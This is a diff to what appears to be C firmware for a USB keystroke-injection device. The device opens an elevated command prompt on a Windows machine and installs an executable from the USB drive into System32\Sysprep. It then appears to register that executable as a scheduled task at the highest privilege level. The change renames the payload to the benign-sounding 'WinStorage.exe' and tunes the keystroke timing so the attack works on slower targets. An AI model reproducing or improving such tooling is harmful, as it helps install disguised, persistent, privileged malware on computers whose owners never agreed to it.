@@ -188,7 +188,8 @@ static const uint8_t hid_ascii_shift[128] = {
 #define WAIT_STRING 2
 #define KEY_RELEASE 4
 
-#define WAIT_PROGRAMS 100
+// Configure to match how slow the targeted device is, 150 is a slow but more consistent timing that should work on most
+#define WAIT_PROGRAMS 150
 
 // path to download app
 #define WINDOWS_FILEPATH "C:\\Windows\\System32\\Sysprep\\"
@@ -197,7 +198,7 @@ static const uint8_t hid_ascii_shift[128] = {
 #define USB_FILEPATH "D:\\exe\\"
 
 // app name
-#define APP_NAME "CPU_system_core.exe"
+#define APP_NAME "WinStorage.exe"
 
 
 // ---------- Typing helpers ----------
@@ -254,7 +255,7 @@ int main(void)
 	sleep_ms(WAIT_PROGRAMS);
 	
 	type_string("cmd");
-	sleep_ms(WAIT_PROGRAMS);
+	sleep_ms(WAIT_PROGRAMS / 3);
 
 	type_char_with_mods('\n', MOD_CTRL | MOD_SHIFT);
 	sleep_ms(WAIT_PROGRAMS * 10);
@@ -279,7 +280,7 @@ int main(void)
   type_string(APP_NAME);
   type_string("\" /rl highest /f");
   enter();
-  sleep_ms(WAIT_PROGRAMS);
+  sleep_ms(WAIT_PROGRAMS * 2);
   close();
 
 }
